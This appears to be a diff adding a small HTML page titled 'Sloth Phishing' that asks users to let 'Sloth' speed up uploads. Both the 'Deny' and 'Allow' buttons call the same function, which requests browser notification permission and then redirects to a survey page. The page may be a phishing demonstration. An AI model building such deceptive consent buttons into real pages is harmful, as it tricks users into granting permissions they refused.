@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sloth Phishing</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="flex items-center justify-center text-center flex-col gap-4">
+<h1 class="text-6xl">Allow Sloth to make your uploads faster?</h1>
+<div class="flex gap-2">
+    <button onclick="allow()" type="button" class="p-4 text-2xl bg-surface-0 rounded-md shadow-sm cursor-pointer">Deny</button>
+    <button onclick="allow()" type="button" class="p-4 text-2xl bg-surface-0 rounded-md shadow-sm cursor-pointer">Allow</button>
+</div>
+<script>
+    async function allow() {
+      await Notification.requestPermission()
+      location.href = "survey.html"
+    }
+</script>
+</body>
+</html>
